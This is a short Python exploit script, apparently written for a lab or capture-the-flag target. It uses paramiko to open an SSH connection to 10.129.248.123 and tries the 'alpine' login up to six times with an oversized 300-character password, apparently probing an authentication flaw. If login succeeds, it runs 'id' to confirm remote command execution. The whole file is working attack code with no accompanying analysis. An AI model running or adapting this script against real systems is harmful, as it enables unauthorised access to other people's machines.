import paramiko
import sys

host = "10.129.248.123"
pw = "A" * 300

t = paramiko.Transport((host, 22))

try:
    t.start_client(timeout=10)
    print("[+] SSH transport established")

    for i in range(1, 7):
        try:
            t.auth_password("alpine", pw)
            print(f"[+] Authentication successful on attempt {i}")
            break
        except paramiko.AuthenticationException:
            print(f"[-] Authentication rejected: attempt {i}")

    if not t.is_authenticated():
        raise Exception("Authentication failed")

    print("[+] Authenticated; requesting session channel")

    ch = t.open_session(timeout=10)
    
    print("[+] Session channel established")

    ch.exec_command("id")

    stdout = ch.makefile("r", -1).read()
    stderr = ch.makefile_stderr("r", -1).read()
    status = ch.recv_exit_status()

    print("[+] STDOUT:", stdout)
    print("[+] STDERR:", stderr)
    print("[+] Exit status:", status)

except Exception as e:
    print(f"[-] Error: {type(e).__name__}: {e}")

finally:
    t.close()